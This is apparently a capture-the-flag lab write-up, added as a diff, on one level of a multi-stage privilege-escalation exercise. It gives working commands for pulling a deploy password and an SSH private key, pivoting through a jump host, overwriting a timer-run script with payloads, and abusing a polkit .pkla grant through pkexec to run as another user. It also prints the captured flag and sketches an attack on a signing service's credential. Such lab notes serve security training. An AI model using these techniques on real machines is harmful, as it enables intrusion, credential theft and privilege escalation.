@@ -1,0 +1,172 @@
+goal: become the release engineer (releng, uid 1002) on the pipeline box
+(pipeline@ghost2-sd-w1qzdt3o, "ACT II : SERVICES") and read /home/releng/flag.
+
+start: fresh ssh to ghost2 (204.168.229.209:2225), then re-derived the WHOLE
+chain from level5 notes in one shot (all done as ONE job through
+hal-deploy-run, base64-nested to dodge quoting, same shape as level5):
+
+  DEPLOY_PW=$(/usr/local/bin/halcyon-backup /var/backups/.vault/deploy.secret \
+    | grep -oE 'deploy-[a-z0-9]+')
+  # piped as stdin into: su deploy -c hal-deploy-run
+  #   line1: $DEPLOY_PW
+  #   line2: "echo <base64 driver> | base64 -d | bash"
+  # driver (runs as builder): drops a bash job into /opt/hal-runner/jobs/,
+  # waits up to 40s, cats results. job (ambient CAP_SETUID as builder):
+  #   python3 ctypes setresuid(1002,1002,1002) -> ops
+  #   hal-guard /etc/halcyon/deploy/id_pipeline > /tmp/id_pipeline_key_l6.txt
+  #   (chmod 0644 so builder-owned driver can read it back)
+
+  gotcha vs. level5: first attempt wrote the key to
+  /home/builder/id_pipeline_key.txt -- failed with "Permission denied",
+  because setresuid only changed uid (1001->1002) not gid (stayed
+  1001/builder), and /home/builder is not group/other-writable. Fixed by
+  writing to /tmp instead (world-writable, sticky bit doesn't block creation)
+  and chmod 644'ing the result so the builder-uid driver could read it back
+  after the job exited. Lesson carried forward from level4/5: files written
+  by a "borrowed" higher uid inside one of these jobs need a target path the
+  *lower* uid can still reach afterward -- /tmp, not $HOME of the lower
+  account.
+
+  recovered id_pipeline key, saved locally to scratchpad, pivoted with it
+  through ghost2 via ProxyCommand exactly as in level5:
+
+    ssh -i id_pipeline -o ProxyCommand="sshpass -e ssh -p 2225 \
+        ghost2@204.168.229.209 -W %h:%p" pipeline@10.67.108.3
+
+  pipeline -> svc-deploy: overwrote the group-writable
+  /opt/halcyon/deploy-step.sh (content only, same as level5 -- root owns the
+  file, pipeline group can write the bytes, halcyon-deploy.timer execs it as
+  svc-deploy every 45s) with recon/exploit payloads, waited for the timer
+  tick, read results back from /tmp (world-readable), then restored the
+  original heartbeat content from a /tmp/deploy-step.sh.orig backup each
+  time before moving to the next step.
+
+kael.txt fragment 2 (read as svc-deploy in a prior session, ghost2/level5
+notes.txt):
+  "Now you are the account that job runs as. Small mercy: you are trusted
+  to act as someone above you, but only in the exact ways someone wrote
+  down. Trust on a box like this is a policy, not a password, and a policy
+  always says more than the person who wrote it meant it to."
+  OBJECTIVE: run as the release engineer.
+
+recon (as svc-deploy, via deploy-step.sh payloads):
+  id -> uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1000(deploy)
+
+  pkaction --verbose -> two custom Halcyon actions among the stock
+  systemd/login1/network1/etc noise:
+
+    com.halcyon.runas-releng
+      implicit any/inactive/active: auth_admin   (all three)
+      annotation: org.freedesktop.policykit.exec.path ->
+                  /usr/local/sbin/halcyon-runas-releng
+
+    com.halcyon.signer-reload
+      implicit any/inactive/active: auth_admin   (all three)
+      annotation: org.freedesktop.policykit.exec.path ->
+                  /usr/local/sbin/halcyon-signer-reload
+
+  /usr/share/polkit-1/actions/com.halcyon.runas-releng.policy (raw XML) ->
+  confirms the same auth_admin defaults -- on paper this action requires
+  interactive admin authentication for ANY caller, svc-deploy included.
+
+  /etc/polkit-1/rules.d/ -> does not exist.
+  /usr/share/polkit-1/rules.d/ -> only systemd-networkd.rules (irrelevant,
+  scoped to subject.user == "systemd-network").
+  /etc/polkit-1/localauthority/ -> "Permission denied" for svc-deploy (can't
+  list it) -- but this doesn't matter: the polkit daemon itself runs as
+  root and evaluates whatever's configured there regardless of what our uid
+  can read. Confirmed its relevance a different way (see below).
+
+  /usr/local/sbin/halcyon-runas-releng (readable, root:root 755):
+    #!/bin/sh
+    if [ "$(id -un)" != "releng" ]; then
+      echo "halcyon-runas-releng: refusing to run as $(id -un); this helper only runs as releng" >&2
+      exit 1
+    fi
+    # Invoked by pkexec (as releng, once com.halcyon.runas-releng is
+    # authorized -- see /etc/polkit-1/localauthority/50-local.d/49-halcyon-runas.pkla
+    # and the self-guard above, which is what actually pins the target to
+    # releng; the .pkla grant alone cannot see pkexec's --user choice). Args
+    # optional: with args, exec them; with none, drop into an interactive shell.
+    if [ "$#" -gt 0 ]; then
+        exec "$@"
+    else
+        exec /bin/bash -i
+    fi
+
+  -> this comment is the whole vulnerability, spelled out by whoever wrote
+  it: there's a legacy-style .pkla grant at
+  /etc/polkit-1/localauthority/50-local.d/49-halcyon-runas.pkla that
+  authorizes the com.halcyon.runas-releng ACTION for svc-deploy (or its
+  group) with no password (Result=yes / equivalent). But a .pkla/.rules
+  grant on an action is not parameterized by pkexec's --user target -- it
+  authorizes "may invoke this action," not "may invoke it as exactly uid
+  1002." The developer's OWN comment admits this ("the .pkla grant alone
+  cannot see pkexec's --user choice") and patches around it with the
+  in-script `id -un != releng` guard -- meaning the *policy* grants svc-deploy
+  the right to pkexec this binary as ANY --user (root included), and the only
+  thing stopping that from being a full root escalation is the script's own
+  userland self-check, which happens to align with the intended scope here.
+  This is exactly kael's line: "a policy always says more than the person
+  who wrote it meant it to" -- the .pkla says more (any --user) than the
+  authors meant (releng only), and only an unrelated shell-script guard
+  narrows it back down. For this level the guard's scope (releng) is exactly
+  the objective, so no need to fight it further -- just call it correctly.
+
+exploit:
+  pkexec --user releng /usr/local/sbin/halcyon-runas-releng id
+    -> uid=1002(releng) gid=1003(releng) groups=1003(releng)
+       exit code: 0, NO password prompt (confirms the .pkla grant fires for
+       svc-deploy with no interactive auth needed)
+
+  pkexec --user releng /usr/local/sbin/halcyon-runas-releng cat /home/releng/flag
+    -> GHS2{10dc218d8b572029b5729b1ee3493947}
+
+flag: GHS2{10dc218d8b572029b5729b1ee3493947}
+
+cleanup: restored /opt/halcyon/deploy-step.sh to its exact original
+heartbeat content (diff'd clean against a /tmp/deploy-step.sh.orig backup
+taken before the first overwrite) after every payload run, so
+halcyon-deploy.timer keeps ticking its normal placeholder log line.
+
+gotchas:
+  - writing job output into a HOME directory owned by a different account
+    than the job's post-setresuid euid fails (Permission denied) even
+    though the process is now that higher uid, because gid never changed --
+    write to /tmp instead (see recon section above). Same underlying lesson
+    as level4/5's "leftover files," just hitting it from the write side
+    this time instead of the cleanup side.
+  - getcap -r / on this box is extremely noisy (spams "Failed to get
+    capabilities" for hundreds of /sys/kernel/** virtual files under a
+    non-root, non-capability-bearing uid) -- not a useful recon step here
+    unlike on the ghost2 box; ignore it and go straight for
+    pkaction/polkit instead once kael's fragment points at "policy."
+  - default pkexec target is root, not the program's "natural" account --
+    `pkexec /usr/local/sbin/halcyon-runas-releng` (no --user) runs it AS
+    ROOT, which immediately trips the script's own `id -un != releng` guard
+    and exits 1. Must pass `--user releng` explicitly to land in the
+    intended (and actually-authorized-without-password) path.
+  - outer ssh to 204.168.229.209 threw the same benign
+    "client_global_hostkeys_prove_confirm: server gave bad signature"
+    noise on every connection (known quirk, harmless, ignore).
+
+--- next up (Act II fragment 3, read as releng) ---
+kael.txt fragment 3:
+  "Release engineer. You can push work, restart what needs restarting.
+  There is a signing service near you that loads a credential the moment
+  it starts, and that credential lives only while the service runs, only
+  inside its own walls. Step outside that window and it is gone, no matter
+  who you are. So do not step outside it."
+  OBJECTIVE: get your own code executing inside the signing service's
+  context.
+  -> matches level5 notes' bonus intel: L7 (g2-l7-credential-vault)
+  overwrites /etc/halcyon/signing.enc, and the flag is the PLAINTEXT exposed
+  via systemd LoadCredential= at
+  /run/credentials/halcyon-signer.service/signing only while
+  halcyon-signer.service is running -- not a static flag file. releng can
+  "push work, restart what needs restarting" -- likely releng owns/controls
+  the signer service's unit or the code it loads (systemctl restart
+  halcyon-signer, or overwriting whatever binary/script the service execs)
+  and needs to get code running AS the signer service (or trigger a restart
+  after planting a payload) to read that in-memory/tmpfs credential before
+  the window closes.
